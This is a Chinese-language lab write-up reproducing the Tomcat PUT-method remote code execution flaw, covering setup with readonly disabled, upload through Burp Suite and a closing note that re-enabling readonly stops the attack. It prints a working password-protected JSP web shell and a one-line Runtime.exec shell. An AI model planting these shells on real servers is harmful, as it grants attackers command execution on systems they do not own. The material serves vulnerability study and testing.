# TOMCAT RCE 1
TomcatRCE漏洞复现
## 1、       介绍：
## 2、       环境搭建：
### 1、       下载问题版本tomcat，地址：`https://archive.apache.org/dist/tomcat/`
### 2、       在windows上安装tomcat<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.1.png)<br>
### 3、       设置readonly配置（配置文件路径为conf/web.xml），该配置禁止（false）时将开启put方法，默认是true。<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.2.png)<br>
查看目前支持的方法：<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.3.png)<br>
在servlet中添加：readonly属性为false<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.4.png)<br>
使用burpsuite抓包：（采用put方法，设置成功）<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.5.png)<br>
环境搭建完毕。
## 3、       漏洞复现：
准备payload:
先准备jsp文件：
```jsp
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
 
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("123456".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println("ok");}%>
```
将该段代码复制到burpsuite表单位置：<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.6.png)<br>
浏览器链接jsp：<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.7.png)<br>
表示上传成功；
执行命令：<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.8.png)<br>
证明命令执行成功。
也可以使用简单的payload：
```<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>```<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.9.png)<br>
将readonly策略开启（设置为true）：<br>
![image](https://github.com/tiaowang1132/poc/blob/master/vuln-test-image/t.10.png)<br>
则不成功。


